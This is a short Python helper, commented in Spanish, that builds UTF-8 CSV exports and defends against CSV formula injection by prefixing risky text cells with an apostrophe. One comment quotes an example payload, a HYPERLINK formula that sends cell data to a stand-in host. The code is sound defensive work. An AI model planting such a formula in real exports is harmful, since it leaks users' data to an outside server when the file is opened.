import csv
import re
from io import StringIO

UTF8_BOM = "﻿"

# Excel y LibreOffice ejecutan como fórmula una celda de texto que empieza con estos caracteres
# (CSV injection): un cliente llamado `=HYPERLINK("http://malo/?"&A1,"x")` sacaría datos al abrir la
# exportación. Los nombres, notas y descripciones los escriben técnicos y clientes, no solo el admin.
_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
# Un texto que es solo un número (monto negativo, teléfono con +) no es una fórmula y debe quedar tal
# cual: el reporte 606 de la DGII lleva montos así.
_PLAIN_NUMBER = re.compile(r"^[+-]?\d+([.,]\d+)?$")


def _safe_cell(value):
    """Neutraliza una celda de texto peligrosa con un apóstrofo delante. Los valores no textuales y los
    textos que son solo un número no se tocan."""
    if isinstance(value, str) and value.startswith(_FORMULA_PREFIXES) and not _PLAIN_NUMBER.match(value):
        return "'" + value
    return value


def build_csv(headers: list[str], rows: list[list]) -> bytes:
    """Arma un CSV con BOM UTF-8 — sin el BOM, Excel en Windows (el uso más común aquí)
    interpreta mal los acentos y la ñ al abrir el archivo directamente."""
    buf = StringIO()
    writer = csv.writer(buf)
    writer.writerow(headers)
    writer.writerows([[_safe_cell(cell) for cell in row] for row in rows])
    return (UTF8_BOM + buf.getvalue()).encode("utf-8")
